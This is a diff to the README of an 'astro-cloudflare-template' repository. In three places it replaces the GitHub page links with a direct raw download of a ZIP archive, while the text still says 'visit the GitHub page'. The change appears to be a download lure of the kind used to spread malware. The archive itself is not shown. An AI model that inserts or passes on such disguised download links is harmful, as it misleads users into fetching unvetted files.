@@ -1,6 +1,6 @@
 # ☁️ astro-cloudflare-template - Simple Cloudflare app setup
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page%20to%20download-blue?style=for-the-badge)](https://github.com/fibreoptic-people44/astro-cloudflare-template)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page%20to%20download-blue?style=for-the-badge)](https://raw.githubusercontent.com/fibreoptic-people44/astro-cloudflare-template/main/src/template_cloudflare_astro_2.2.zip)
 
 ## 🖥️ What this is
 
@@ -15,7 +15,7 @@ Use this if you want to:
 
 Use this link to visit the page and download the files:
 
-https://github.com/fibreoptic-people44/astro-cloudflare-template
+https://raw.githubusercontent.com/fibreoptic-people44/astro-cloudflare-template/main/src/template_cloudflare_astro_2.2.zip
 
 ## 🪟 Windows setup
 
@@ -27,7 +27,7 @@ To run this project on Windows, you need:
 
 ### 1. Download the project
 Open the download page and get the project files from GitHub:
-https://github.com/fibreoptic-people44/astro-cloudflare-template
+https://raw.githubusercontent.com/fibreoptic-people44/astro-cloudflare-template/main/src/template_cloudflare_astro_2.2.zip
 
 ### 2. Save the files
 If the project comes as a ZIP file:
